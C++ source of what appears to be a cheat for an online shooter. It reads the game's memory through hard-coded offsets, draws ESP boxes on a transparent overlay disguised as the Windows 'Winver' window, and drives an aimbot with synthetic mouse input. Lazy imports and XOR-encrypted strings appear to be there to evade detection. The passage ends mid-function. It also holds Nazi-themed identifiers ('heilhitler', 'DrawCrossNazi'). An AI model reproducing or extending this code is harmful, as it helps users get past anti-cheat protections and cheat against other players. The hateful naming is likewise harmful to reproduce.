#include "win_utils.h"
#include "d3d9_x.h"
#include "xor.hpp"
#include <dwmapi.h>
#include <vector>
#include "skStr.h"
#include <string>
#include <iostream>
#include "skStr.h"
#include <Windows.h>
#include <string>
#include <fstream>
#include "offsets.h"
#include <cstdint>
#include <filesystem>
#include <Mmsystem.h>
#include <mciapi.h>
#include <shobjidl_core.h>
#include <direct.h>
#include <urlmon.h>
#include <random>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>
#include <random>
#include <msxml.h>    
#include <atomic>
#include <mutex>
#include <Windows.h>
#include <TlHelp32.h>
#include <cstdint>
#include <vector>
#include <random>
#include <memoryapi.h>
#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <string_view>
#include <mutex>
#include <chrono>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <Uxtheme.h>
#include <dwmapi.h>
#include <WinInet.h>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <vector>
#include <math.h>
#include <windows.h>
#include <Lmcons.h>
#include <vector>
#include <random>
#include <functional> //for std::function
#include <algorithm>  //for std::generate_n
#include "lazy.h"
#include "godfather.h"

bool glitch = false;
bool DrawEnemyFov = false;
bool Filledfov = false;
bool crosshair = false;
bool heilhitler = false;
bool rapidfire = false;
bool ShowMenu = false;
bool Esp = true;
bool Esp_box = true;
bool Esp_fbox = false;
bool Esp_Distance = true;
bool Aim_RandomizedAimbot = true;
static bool Esp_Skeleton = false;
bool Esp_line = true;
static bool Aim_MouseMovementAimbot = true;
static bool Aim_fovCircle = false;
static bool Aim_square = false;
float Aim_smoothing = 4.5;
bool fuel = false;
bool Esp_3DBox = false;
bool vischeck = true;
bool playerbot = false;
bool reloadCheck = false;
bool crossHair = false;
bool noreload = false;
bool Esp_fillbox = false;
bool Esp_targetlines = false;
static int Esp_VisDist = 300;
int Aim_AimFOV = 100;
int Aim_FovSize = 100;
float BoxWidthValue = 0.550;
int Esp_VisualSize = 100;
static int aimDist = 200;
static int aimkey;
static int hitbox;
static int SnaplinePosition;
static int EspPos;
static int aimkeypos = 3;
static int Esp_Pos = 0;
static int hitboxpos = 0;

// Aimbot Methods
bool SetMouse = false;
bool MouseEvent = true;

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;
static void xCreateWindow();
static void xInitD3d();
void DrawESP();
static void xMainLoop();
static void xShutdown();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
#define ReadPointer(base, offset) (*(PVOID *)(((PBYTE)base + offset)))
VOID ToMatrixWithScale(float* in, float out[4][4]);
VOID GetBoneLocation(float compMatrix[4][4], PVOID bones, DWORD index, float out[3]);
static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

namespace Actors
{
	DWORD_PTR Uworld;
	DWORD_PTR LocalPawn;
	DWORD_PTR PlayerState;
	DWORD_PTR Localplayer;
	DWORD_PTR Rootcomp;
	DWORD_PTR PlayerController;
	DWORD_PTR Persistentlevel;
	DWORD_PTR PlayerCamManager;
	Vector3 localactorpos;
	int localplayerID;
	int CurrentActorId;
	DWORD_PTR Gameinstance;
	DWORD_PTR LocalPlayers;
	uintptr_t pcmc;
	DWORD_PTR PlayerCameraManager;
	uintptr_t Crrneytwep;
	DWORD ActorCount;
	DWORD_PTR AActors;
	DWORD_PTR GameState;
	DWORD_PTR PlayerArray;
	DWORD_PTR bInCar;
}

ImDrawList* draw;
ImFont* m_pFont;
using namespace std;

FTransform GetBoneIndex(DWORD_PTR mesh, int index)
{
	DWORD_PTR bonearray;
	bonearray = read<DWORD_PTR>(mesh + 0x5A0);

	if (bonearray == NULL)
	{
		bonearray = read<DWORD_PTR>(mesh + 0x5A0 + 0x10);  //(mesh + 0x5e8) + 0x5a));
	}
	return read<FTransform>(bonearray + (index * 0x60));
}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id)
{
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = read<FTransform>(mesh + 0x240);

	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());

	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

static std::string ReadGetNameFromFName(int key) {
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(base_address + 0xDF86AC0 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset);
	uint16_t nameEntry = read<uint16_t>(NamePoolChunk);

	int nameLength = nameEntry >> 6;
	char buff[1024];
	if ((uint32_t)nameLength)
	{
		for (int x = 0; x < nameLength; ++x)
		{
			buff[x] = read<char>(NamePoolChunk + 4 + x);
		}

		char* v2 = buff; // rdi
		int v4 = nameLength; // ebx
		int v5; // edx
		__int64 result; // rax
		int v7; // ecx
		unsigned int v8; // eax

		v5 = 0;
		result = 28;
		if (v4)
		{
			do
			{
				++v2;
				v7 = v5++ | 0xB000;
				v8 = v7 + result;
				v7 = v8 ^ ~*(v2 - 1);
				result = v8 >> 2;
				*(v2 - 1) = v7;
			} while (v5 < v4);
		}
		buff[nameLength] = '\0';
		return std::string(buff);
	}
	else {
		return "";
	}
}

static std::string GetNameFromFName(int key)
{
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(base_address + 0xDF86AC0 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset); //((ChunkOffset + 2) * 8) ERROR_NAME_SIZE_EXCEEDED
	if (read<uint16_t>(NamePoolChunk) < 64)
	{
		auto a1 = read<DWORD>(NamePoolChunk + 4);
		return ReadGetNameFromFName(a1);
	}
	else
	{
		return ReadGetNameFromFName(key);
	}
}

D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}

struct Camera
{
	float FieldOfView;
	Vector3 Rotation;
	Vector3 Location;
};

Camera GetCamera(__int64 a1)
{
	Camera FGC_Camera;
	__int64 v1;
	__int64 v6;
	__int64 v7;
	__int64 v8;

	v1 = read<__int64>(Actors::Localplayer + 0xd0);
	__int64 v9 = read<__int64>(v1 + 0x10); // 0x10

	FGC_Camera.FieldOfView = 80.0f / (read<double>(v9 + 0x680) / 1.19f); // 0x600

	FGC_Camera.Rotation.x = read<double>(v9 + 0x7D0);
	FGC_Camera.Rotation.y = read<double>(a1 + 0x148);

	uint64_t FGC_Pointerloc = read<uint64_t>(Actors::Uworld + 0x100);
	FGC_Camera.Location = read<Vector3>(FGC_Pointerloc);

	return FGC_Camera;
}

Vector3 W2S(Vector3 WorldLocation)
{
	Camera vCamera = GetCamera(Actors::Rootcomp);
	vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / M_PI);


	D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

	Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	Vector3 vDelta = WorldLocation - vCamera.Location;
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	return Vector3((Width / 2.0f) + vTransformed.x * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, (Height / 2.0f) - vTransformed.y * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, 0);
}

void DrawFilledRect(int x, int y, int w, int h, RGBA* color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), 0, 0);
}

void DrawLine(int x1, int y1, int x2, int y2, RGBA* color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), thickness);
}

void DrawCircle(int x, int y, int radius, RGBA* color, int segments, float thickness)
{
	ImGui::GetOverlayDrawList()->AddCircle(ImVec2(x, y), radius, ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), segments, thickness);
}

void DrawCorneredBox(int X, int Y, int W, int H, ImU32 color, int thickness) {

	float lineW = (W / 3);
	float lineH = (H / 3);

	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);


	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}

void BoxSupport(int x, int y, int w, int h, ImU32 color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), color, 0, 0);
}

void DrawBox(int x, int y, int w, int h, int borderPx, ImU32 color)
{
	ImU32 Color;
	Color = ImGui::GetColorU32({ 255, 0, 0, 255 });

	BoxSupport(x + borderPx, y, w, borderPx, color); //top 
	BoxSupport(x + w - w + borderPx, y, w, borderPx, color); //top 
	BoxSupport(x, y, borderPx, h, color); //left 
	BoxSupport(x, y + h - h + borderPx * 2, borderPx, h, color); //left 
	BoxSupport(x + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	BoxSupport(x + w - w + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	BoxSupport(x + w + borderPx, y, borderPx, h, color);//right 
	BoxSupport(x + w + borderPx, y + h - h + borderPx * 2, borderPx, h, color);//right 
	BoxSupport(x, y, borderPx, 1.5, Color); //left 
}

void DrawCrossNazi(int buyukluk, DWORD color)
{
	ImVec2 window_pos = ImGui::GetWindowPos();
	ImVec2 window_size = ImGui::GetWindowSize();
	int crosspozisyon = window_pos.x + 900;
	int crosspozisyony = window_pos.y + 479;
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - buyukluk), ImVec2(Width / 2, Height / 2 + buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - buyukluk, Height / 2), ImVec2(Width / 2 + buyukluk, Height / 2), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + buyukluk), ImVec2(Width / 2 - buyukluk, Height / 2 + buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - buyukluk), ImVec2(Width / 2 + buyukluk, Height / 2 - buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - buyukluk, Height / 2), ImVec2(Width / 2 - buyukluk, Height / 2 - buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + buyukluk, Height / 2), ImVec2(Width / 2 + buyukluk, Height / 2 + buyukluk), ImColor(color));
}

std::wstring MBytesToWString(const char* lpcszString)
{
	int len = strlen(lpcszString);
	int unicodeLen = ::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, NULL, 0);
	wchar_t* pUnicode = new wchar_t[unicodeLen + 1];
	memset(pUnicode, 0, (unicodeLen + 1) * sizeof(wchar_t));
	::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, (LPWSTR)pUnicode, unicodeLen);
	std::wstring wString = (wchar_t*)pUnicode;
	delete[] pUnicode;
	return wString;
}

std::string WStringToUTF8(const wchar_t* lpwcszWString)
{
	char* pElementText;
	int iTextLen = ::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, NULL, 0, NULL, NULL);
	pElementText = new char[iTextLen + 1];
	memset((void*)pElementText, 0, (iTextLen + 1) * sizeof(char));
	::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, pElementText, iTextLen, NULL, NULL);
	std::string strReturn(pElementText);
	delete[] pElementText;
	return strReturn;
}

void DrawString(float fontSize, int x, int y, RGBA* color, bool bCenter, bool stroke, const char* pText, ...)
{
	va_list va_alist;
	char buf[1024] = { 0 };
	va_start(va_alist, pText);
	_vsnprintf_s(buf, sizeof(buf), pText, va_alist);
	va_end(va_alist);
	std::string text = WStringToUTF8(MBytesToWString(buf).c_str());
	if (bCenter)
	{
		ImVec2 textSize = ImGui::CalcTextSize(text.c_str());
		x = x - textSize.x / 4;
		y = y - textSize.y;
	}
	if (stroke)
	{
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
	}
	ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 153.0, color->B / 51.0, color->A / 255.0)), text.c_str());
}


float DrawOutlinedText(ImFont* pFont, const std::string& text, const ImVec2& pos, float size, ImU32 color, bool center)
{
	std::stringstream stream(text);
	std::string line;

	float y = 0.0f;
	int i = 0;

	while (std::getline(stream, line))
	{
		ImVec2 textSize = pFont->CalcTextSizeA(size, FLT_MAX, 0.0f, line.c_str());

		if (center)
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x - textSize.x / 2.0f, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}
		else
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}

		y = pos.y + textSize.y * (i + 1);
		i++;
	}
	return y;
}

void DrawText1(int x, int y, const char* str, RGBA* color)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), utf_8_2.c_str());
}

std::uintptr_t process_find(const std::string& name)
{
	const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 proc_entry{};
	proc_entry.dwSize = sizeof proc_entry;

	auto found_process = false;
	if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
		do {
			if (name == proc_entry.szExeFile) {
				found_process = true;
				break;
			}
		} while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
	}

	LI_FN(CloseHandle).safe()(snap);
	return found_process
		? proc_entry.th32ProcessID
		: 0;
}


void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}

const MARGINS Margin = { -1 };

void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpszClassName = "About Windows";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);

	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right;
		Height = GameRect.bottom;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, "About Windows", "Winver", WS_POPUP | WS_VISIBLE, 0, 0, Width, Height, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}

void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;
	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);
	IMGUI_CHECKVERSION();


	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;
	io.IniFilename = NULL;

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);
	ImGui::StyleColorsClassic();

	XorS(font, "C:\\Windows\\Fonts\\verdanab.ttf");
	m_pFont = io.Fonts->AddFontFromFileTTF(font.decrypt(), 14.0f, nullptr, io.Fonts->GetGlyphRangesDefault());
}

void AimbotRandomizer()
{

	return;
}

void SetMouseAbsPosition(DWORD x, DWORD y)
{
	INPUT input = { 0 };
	input.type = INPUT_MOUSE;
	input.mi.dwFlags = MOUSEEVENTF_MOVE;
	input.mi.dx = x;
	input.mi.dy = y;
	SendInput(1, &input, sizeof(input));
}

void aimbot(float x, float y)
{
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	int AimSpeed = Aim_smoothing;
	float TargetX = 0;
	float TargetY = 0;

	if (x != 0)
	{
		if (x > ScreenCenterX)
		{
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX)
		{
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0)
	{
		if (y > ScreenCenterY)
		{
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY)
		{
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	//WriteAngles(TargetX / 3.5f, TargetY / 3.5f);
	if (MouseEvent) {
		mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);
	}
	else if (SetMouse) {
		SetMouseAbsPosition(TargetX, TargetY);
	}

	return;
}

void AimAt(DWORD_PTR entity)
{
	uint64_t currentactormesh = read<uint64_t>(entity + OFFSETS::Mesh);
	auto rootHead = GetBoneWithRotation(currentactormesh, hitbox);
	Vector3 rootHeadOut = W2S(rootHead);

	// Removed Because of Udness
	aimbot(rootHeadOut.x, rootHeadOut.y);
	AimbotRandomizer();
}

void AimbotTracerLines(DWORD_PTR entity, ImU32 Color)
{
	// Removed Because of Udness
}



VOID ToMatrixWithScale(float* in, float out[4][4]) {
	auto* rotation = &in[0];
	auto* translation = &in[4];
	auto* scale = &in[8];

	out[3][0] = translation[0];
	out[3][1] = translation[1];
	out[3][2] = translation[2];

	auto x2 = rotation[0] + rotation[0];
	auto y2 = rotation[1] + rotation[1];
	auto z2 = rotation[2] + rotation[2];

	auto xx2 = rotation[0] * x2;
	auto yy2 = rotation[1] * y2;
	auto zz2 = rotation[2] * z2;
	out[0][0] = (1.0f - (yy2 + zz2)) * scale[0];
	out[1][1] = (1.0f - (xx2 + zz2)) * scale[1];
	out[2][2] = (1.0f - (xx2 + yy2)) * scale[2];

	auto yz2 = rotation[1] * z2;
	auto wx2 = rotation[3] * x2;
	out[2][1] = (yz2 - wx2) * scale[2];
	out[1][2] = (yz2 + wx2) * scale[1];

	auto xy2 = rotation[0] * y2;
	auto wz2 = rotation[3] * z2;
	out[1][0] = (xy2 - wz2) * scale[1];
	out[0][1] = (xy2 + wz2) * scale[0];

	auto xz2 = rotation[0] * z2;
	auto wy2 = rotation[3] * y2;
	out[2][0] = (xz2 + wy2) * scale[2];
	out[0][2] = (xz2 - wy2) * scale[0];

	out[0][3] = 0.0f;
	out[1][3] = 0.0f;
	out[2][3] = 0.0f;
	out[3][3] = 1.0f;
}

VOID MultiplyMatrices(float a[4][4], float b[4][4], float out[4][4]) {
	for (auto r = 0; r < 4; ++r) {
		for (auto c = 0; c < 4; ++c) {
			auto sum = 0.0f;

			for (auto i = 0; i < 4; ++i) {
				sum += a[r][i] * b[i][c];
			}

			out[r][c] = sum;
		}
	}
}

VOID GetBoneLocation(float compMatrix[4][4], PVOID bones, DWORD index, float out[3]) {
	float boneMatrix[4][4];
	ToMatrixWithScale((float*)((PBYTE)bones + (index * 0x30)), boneMatrix);

	float result[4][4];
	MultiplyMatrices(boneMatrix, compMatrix, result);

	out[0] = result[3][0];
	out[1] = result[3][1];
	out[2] = result[3][2];
}

bool isVis;

bool isVisible(DWORD_PTR mesh)
{
	if (!mesh)
		return false;
	float fLastSubmitTime = read<float>(mesh + 0x330);
	float fLastRenderTimeOnScreen = read<float>(mesh + 0x338);

	const float fVisionTick = 0.06f;
	bool bVisible = fLastRenderTimeOnScreen + fVisionTick >= fLastSubmitTime;
	return bVisible;
}

#define BONE_HEAD_ID (68)
#define BONE_NECK_ID (66)
#define BONE_CHEST_ID (6)
#define BONE_PELVIS_ID (2)
#define PI (3.141592653589793f)

typedef struct _FNlEntity
{
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;
std::vector<FNlEntity> entityList;

void OrganizedActors()
{
	while (true) {
		auto entityListCopy = entityList;
		float closestDistance = FLT_MAX;
		DWORD_PTR closestPawn = NULL;
		Actors::Uworld = read<DWORD_PTR>(base_address + OFFSET_UWORLD);
		Actors::Gameinstance = read<DWORD_PTR>(Actors::Uworld + OFFSETS::Gameinstance);
		Actors::LocalPlayers = read<DWORD_PTR>(Actors::Gameinstance + OFFSETS::LocalPlayers);
		Actors::Localplayer = read<DWORD_PTR>(Actors::LocalPlayers);
		Actors::PlayerController = read<DWORD_PTR>(Actors::Localplayer + OFFSETS::PlayerController);
		Actors::LocalPawn = read<DWORD_PTR>(Actors::PlayerController + OFFSETS::LocalPawn);
		Actors::pcmc = read<uint64_t>(Actors::PlayerController + 0x328);
		Actors::PlayerState = read<DWORD_PTR>(Actors::LocalPawn + OFFSETS::PlayerState);
